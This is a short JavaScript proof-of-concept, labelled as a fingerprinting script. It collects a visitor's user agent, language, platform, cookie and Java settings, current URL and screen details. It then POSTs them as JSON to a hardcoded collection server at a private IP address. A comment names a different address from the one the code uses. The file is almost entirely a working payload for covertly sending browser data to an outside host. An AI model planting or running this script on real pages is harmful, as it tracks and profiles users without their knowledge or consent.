// Fingerprinting Script (PoC)

// var fingerprintData = {};

//             // Collect device information
//             fingerprintData.userAgent = navigator.userAgent;
//             fingerprintData.language = navigator.language;
//             fingerprintData.platform = navigator.platform;

//             // Additional information
//             fingerprintData.cookiesEnabled = navigator.cookieEnabled;
//             fingerprintData.javaEnabled = navigator.javaEnabled();

//             // Get the URI (where the script is running from)
//             fingerprintData.uri = window.location.href;

var callback = {};
callback.userAgent = navigator.userAgent;
callback.language = navigator.language;
callback.platform = navigator.platform;
callback.cookiesEnabled = navigator.cookieEnabled;
callback.javaEnabled = navigator.javaEnabled();
callback.uri = window.location.href;
// Other data
callback.screendData = {
	width: screen.width,
	height: screen.height,
	colorDepth: screen.colorDepth
};

// Wrap as json
var json = JSON.stringify(callback);
// Send to server / report
console.log(json);

// Send to 10.0.1.1:80/report
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://192.168.12.150:80/report", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(json);
